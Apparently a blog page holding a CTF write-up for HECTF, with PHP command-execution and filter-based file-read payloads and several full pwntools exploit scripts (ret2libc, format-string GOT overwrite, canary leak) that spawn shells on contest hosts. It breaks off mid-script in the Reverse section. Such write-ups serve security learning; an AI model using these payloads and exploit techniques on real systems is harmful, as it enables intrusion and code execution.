@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="0xbz7sb7">
+
+
+    <meta name="subtitle" content="欢迎交流学习">
+
+
+
+
+<title>[WriteUp] HECTF WriteUp | 0xbz7sb7</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">0xbz7sb7&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">0xbz7sb7&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">[WriteUp] HECTF WriteUp</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">0xbz7sb7</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">November 4, 2019&nbsp;&nbsp;16:22:17</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/WriteUp/">WriteUp</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h3><p>有 cmd 和 php_cmd 两个参数，一直在想怎么利用 cmd</p>
+<p>后来发现其实直接 php_cmd 就可以了</p>
+<blockquote>
+<p>?php_cmd=echo exec(“cat /flag.txt”);</p>
+</blockquote>
+<h3 id="忘记名字了，"><a href="#忘记名字了，" class="headerlink" title="忘记名字了，"></a>忘记名字了，</h3><p>用 data:// 协议让用户名为 admin，空数组绕过密码检查，然后 filter 读任意文件的 base64 编码，读到后解码拿到 flag</p>
+<blockquote>
+<p>?user=data:text/plain;base64,YWRtaW4=&amp;pass=[]&amp;file=php://filter/read=convert.base64-encode/resource=f1a9.php</p>
+</blockquote>
+<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="easy-pwn"><a href="#easy-pwn" class="headerlink" title="easy_pwn"></a>easy_pwn</h3><p>简单的 ret2libc ，leak 出 libc 然后覆盖返回地址拿 shell </p>
+<p>直接上 exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(func_name, func_addr)</span>:</span></span><br><span class="line">    libc = LibcSearcher(func_name, func_addr)</span><br><span class="line">    libc_base = func_addr - libc.dump(func_name)</span><br><span class="line">    sys_addr = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">    sh_addr = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">    <span class="keyword">return</span> (sys_addr, sh_addr)</span><br><span class="line"></span><br><span class="line">host = <span class="string">"183.129.189.60"</span></span><br><span class="line">port = <span class="number">10016</span></span><br><span class="line">r = remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    elf = ELF(<span class="string">"pwn"</span>)</span><br><span class="line"></span><br><span class="line">    puts_plt = elf.plt[<span class="string">b"puts"</span>]</span><br><span class="line">    libc_start_main_got = elf.got[<span class="string">b"__libc_start_main"</span>]</span><br><span class="line">    main_addr = elf.symbols[<span class="string">b"main"</span>]</span><br><span class="line">    pop_rdi = <span class="number">0x4007d3</span></span><br><span class="line"></span><br><span class="line">    r.sendlineafter(<span class="string">"name: "</span>, <span class="string">b"hacker"</span>)</span><br><span class="line">    payload = <span class="string">b"a"</span>*<span class="number">0x58</span> + p64(pop_rdi) + p64(libc_start_main_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">    r.sendlineafter(<span class="string">"game: \n"</span>, payload)</span><br><span class="line">    </span><br><span class="line">    leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">    sys_addr, sh_addr = leak(<span class="string">"__libc_start_main"</span>, leak_addr)</span><br><span class="line"></span><br><span class="line">    r.sendlineafter(<span class="string">"name: "</span>, <span class="string">b"hacker"</span>)</span><br><span class="line">    payload = <span class="string">b"a"</span>*<span class="number">0x58</span> + p64(pop_rdi) + p64(sh_addr) + p64(sys_addr) + p64(main_addr)</span><br><span class="line">    r.sendlineafter(<span class="string">"game: \n"</span>, payload)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># context.log_level = "debug"</span></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="middle-pwn"><a href="#middle-pwn" class="headerlink" title="middle_pwn"></a>middle_pwn</h3><p>格式化字符串，因为调试的时候看到在调用 printf 之前 rcx 中的值是指向 libc 中偏移 0xf7260 处的，所以直接 leak 出 rcx 就可以算出 libc 和 system</p>
+<p>但因为是 64 位的，修改地址比较麻烦，分成三段从小到大修改的，不会用 fmtstr_payload 就只好自己动手了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">"183.129.189.60"</span></span><br><span class="line">port = <span class="number">10003</span></span><br><span class="line">r = remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    printf_got = <span class="number">0x601028</span></span><br><span class="line">    rcx_offset = <span class="number">0xf7260</span> <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b"%3$16lx."</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Input: \n"</span>, payload)</span><br><span class="line"></span><br><span class="line">    libc_base = int(r.readuntil(<span class="string">"."</span>)[:<span class="number">-1</span>], <span class="number">16</span>) - rcx_offset</span><br><span class="line">    print(<span class="string">"libc_base ==&gt; "</span>, hex(libc_base))</span><br><span class="line">    sys_addr = libc_base + <span class="number">0x45390</span></span><br><span class="line"></span><br><span class="line">    sys_low_addr = (sys_addr &amp; <span class="number">0x00000000ffff</span>)</span><br><span class="line">    sys_mid_addr = (sys_addr &amp; <span class="number">0x0000ffff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">    sys_hig_addr = (sys_addr &amp; <span class="number">0xffff00000000</span>) &gt;&gt; <span class="number">32</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"sys_low_addr ==&gt; "</span>, sys_low_addr)</span><br><span class="line">    print(<span class="string">"sys_mid_addr ==&gt; "</span>, sys_mid_addr)</span><br><span class="line">    print(<span class="string">"sys_hig_addr ==&gt; "</span>, sys_hig_addr)</span><br><span class="line"></span><br><span class="line">    addr_list = [(sys_low_addr, printf_got), (sys_mid_addr, printf_got+<span class="number">2</span>), (sys_hig_addr, printf_got+<span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(addr_list)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i, len(addr_list)):</span><br><span class="line">            <span class="keyword">if</span> addr_list[j][<span class="number">0</span>] &lt; addr_list[i][<span class="number">0</span>]:</span><br><span class="line">                temp = addr_list[i]</span><br><span class="line">                addr_list[i] = addr_list[j]</span><br><span class="line">                addr_list[j] = temp</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b"%"</span> + bytes(str(addr_list[<span class="number">0</span>][<span class="number">0</span>]), encoding=<span class="string">"utf8"</span>) + <span class="string">b"c"</span></span><br><span class="line">    payload += <span class="string">b"%11$hn"</span></span><br><span class="line">    payload += <span class="string">b"%"</span> + bytes(str(addr_list[<span class="number">1</span>][<span class="number">0</span>]-addr_list[<span class="number">0</span>][<span class="number">0</span>]), encoding=<span class="string">"utf8"</span>) + <span class="string">b"c"</span></span><br><span class="line">    payload += <span class="string">b"%12$hn"</span></span><br><span class="line">    payload += <span class="string">b"%"</span> + bytes(str(addr_list[<span class="number">2</span>][<span class="number">0</span>]-addr_list[<span class="number">1</span>][<span class="number">0</span>]), encoding=<span class="string">"utf8"</span>) + <span class="string">b"c"</span></span><br><span class="line">    payload += <span class="string">b"%13$hn"</span></span><br><span class="line">    payload += <span class="string">b"aa"</span></span><br><span class="line">    payload += p64(addr_list[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">    payload += p64(addr_list[<span class="number">1</span>][<span class="number">1</span>])</span><br><span class="line">    payload += p64(addr_list[<span class="number">2</span>][<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r.sendlineafter(<span class="string">"Input: \n"</span>, payload)</span><br><span class="line">    r.sendafter(<span class="string">"Input: \n"</span>, <span class="string">b"/bin/sh\x00"</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># context.log_level = "debug"</span></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="wowotou"><a href="#wowotou" class="headerlink" title="wowotou"></a>wowotou</h3><p>简单的格式化字符串，并且给出了 v5 的地址，直接改就行了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#host = "183.129.189.60"</span></span><br><span class="line">host = <span class="string">"192.168.136.129"</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line">r = remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    addr = int(r.recvline()[:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line">    payload = p32(addr) + <span class="string">b"%6$n"</span></span><br><span class="line">    r.sendlineafter(<span class="string">"sorghum?"</span>, payload)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># context.log_level = "debug"</span></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="van"><a href="#van" class="headerlink" title="van"></a>van</h3><p>还是格式化字符串漏洞，泄漏出 libc 基地址和 代码段基地址 还有 canary 就可以为所欲为了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">"183.129.189.60"</span></span><br><span class="line">port = <span class="number">10023</span></span><br><span class="line">r = remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">b"%4$16lx.%17$16lx.%19$16lx."</span></span><br><span class="line">    r.sendafter(<span class="string">"name:"</span>, payload)</span><br><span class="line">    r.sendafter(<span class="string">"message:"</span>, <span class="string">b"hello"</span>)</span><br><span class="line"></span><br><span class="line">    code_base = int(r.readuntil(<span class="string">"."</span>)[:<span class="number">-1</span>], <span class="number">16</span>) - <span class="number">0xbe0</span></span><br><span class="line">    canary = int(r.recvuntil(<span class="string">"."</span>)[:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line">    libc_base = int(r.recvuntil(<span class="string">"."</span>)[:<span class="number">-1</span>], <span class="number">16</span>) - <span class="number">0x20830</span></span><br><span class="line">    print(<span class="string">"canary ==&gt; "</span>, hex(canary))</span><br><span class="line">    print(<span class="string">"libc_base ==&gt; "</span>, hex(libc_base))</span><br><span class="line"></span><br><span class="line">    pop_rdi = code_base + <span class="number">0xbd3</span></span><br><span class="line">    sys_addr = libc_base + <span class="number">0x45390</span></span><br><span class="line">    sh_addr = libc_base + <span class="number">0x18cd57</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b"yes\n\x00aaa"</span> + <span class="string">b"a"</span>*<span class="number">0x10</span> + p64(canary) + p64(<span class="number">0xdeadbeefbabecafe</span>)</span><br><span class="line">    payload += p64(pop_rdi) + p64(sh_addr) + p64(sys_addr) + p64(code_base+<span class="number">0x9f2</span>)</span><br><span class="line">    r.sendafter(<span class="string">"me?\n"</span>, payload)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># context.log_level = "debug"</span></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="stackpwn"><a href="#stackpwn" class="headerlink" title="stackpwn"></a>stackpwn</h3><p>简单的 ret2libc 直接上 exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(func_name, func_addr)</span>:</span></span><br><span class="line">    libc = LibcSearcher(func_name, func_addr)</span><br><span class="line">    libc_base = func_addr - libc.dump(func_name)</span><br><span class="line">    sys_addr = libc_base + libc.dump(<span class="string">"system"</span>) <span class="comment"># 0x45390</span></span><br><span class="line">    sh_addr = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>) <span class="comment"># 0x18cd57</span></span><br><span class="line">    <span class="keyword">return</span> (sys_addr, sh_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#host = "183.129.189.60"</span></span><br><span class="line">host = <span class="string">"192.168.136.129"</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line">r = remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    elf = ELF(<span class="string">"stackpwn"</span>)</span><br><span class="line"></span><br><span class="line">    puts_plt = elf.plt[<span class="string">b"puts"</span>]</span><br><span class="line">    libc_start_main_got = elf.got[<span class="string">b"__libc_start_main"</span>]</span><br><span class="line">    vuln_addr = elf.symbols[<span class="string">b"vuln"</span>]</span><br><span class="line">    pop_rdi = <span class="number">0x400933</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b"a"</span> * <span class="number">0x10</span> + p64(<span class="number">0xdeadbeefbabecafe</span>)</span><br><span class="line">    payload += p64(pop_rdi) + p64(libc_start_main_got) + p64(puts_plt) + p64(vuln_addr)</span><br><span class="line">    r.sendlineafter(<span class="string">"instructions...\n"</span>, payload)</span><br><span class="line"></span><br><span class="line">    leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">    sys_addr, sh_addr = leak(<span class="string">"__libc_start_main"</span>, leak_addr)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b"a"</span> * <span class="number">0x10</span> + p64(<span class="number">0xdeadbeefbabecafe</span>)</span><br><span class="line">    payload += p64(pop_rdi) + p64(sh_addr) + p64(sys_addr) + p64(vuln_addr)</span><br><span class="line">    r.sendlineafter(<span class="string">"instructions...\n"</span>, payload)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># context.log_level = "debug"</span></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="stackpwn2"><a href="#stackpwn2" class="headerlink" title="stackpwn2"></a>stackpwn2</h3><p>先格式化字符串 leak 出 canary 再 ret2libc 就可以了，很简单</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(func_name, func_addr)</span>:</span></span><br><span class="line">    libc = LibcSearcher(func_name, func_addr)</span><br><span class="line">    libc_base = func_addr - libc.dump(func_name)</span><br><span class="line">    sys_addr = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">    sh_addr = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">    <span class="keyword">return</span> (sys_addr, sh_addr)</span><br><span class="line"></span><br><span class="line">host = <span class="string">"183.129.189.60"</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">r = remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    elf = ELF(<span class="string">"stackpwn2"</span>)</span><br><span class="line"></span><br><span class="line">    libc_start_main_got = elf.got[<span class="string">b"__libc_start_main"</span>]</span><br><span class="line">    puts_plt = elf.plt[<span class="string">b"puts"</span>]</span><br><span class="line">    func2_addr = elf.symbols[<span class="string">b"func2"</span>]</span><br><span class="line">    pop_rdi = <span class="number">0x4009c3</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b"%9$16lx"</span></span><br><span class="line">    r.sendlineafter(<span class="string">"system...\n"</span>, payload)</span><br><span class="line"></span><br><span class="line">    canary = int(r.recvuntil(<span class="string">"What"</span>)[:<span class="number">-4</span>], <span class="number">16</span>)</span><br><span class="line">    print(<span class="string">"canary ==&gt; "</span>, hex(canary))</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b"a"</span>*<span class="number">0x18</span> + p64(canary) + p64(<span class="number">0xdeadbeefbabecafe</span>)</span><br><span class="line">    payload += p64(pop_rdi) + p64(libc_start_main_got) + p64(puts_plt) + p64(func2_addr)</span><br><span class="line">    r.sendafter(<span class="string">"to do?\n"</span>, payload)</span><br><span class="line"></span><br><span class="line">    leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">    sys_addr, sh_addr = leak(<span class="string">"__libc_start_main"</span>, leak_addr)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b"a"</span>*<span class="number">0x18</span> + p64(canary) + p64(<span class="number">0xdeadbeefbabecafe</span>)</span><br><span class="line">    payload += p64(pop_rdi) + p64(sh_addr) + p64(sys_addr) + p64(func2_addr)</span><br><span class="line">    r.send(payload)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># context.log_level = "debug"</span></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="helloRE"><a href="#helloRE" class="headerlink" title="helloRE"></a>helloRE</h3><p>输入字符串之后，简单处理然后比较，解密后似乎是 base64，根据群主提示第九位字符是 Z 改了之后解码得到 flag</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"encoding/base64"</span></span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> (</span><br><span class="line">		src  = []<span class="keyword">byte</span>(<span class="string">"aY9)Z(?|ZX9xOC9z_i9eOYCw"</span>)</span><br><span class="line">		temp <span class="keyword">byte</span></span><br><span class="line">	)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(src); i++ &#123;</span><br><span class="line">		temp = src[i]</span><br><span class="line">		<span class="keyword">if</span> temp &gt;= <span class="number">40</span> 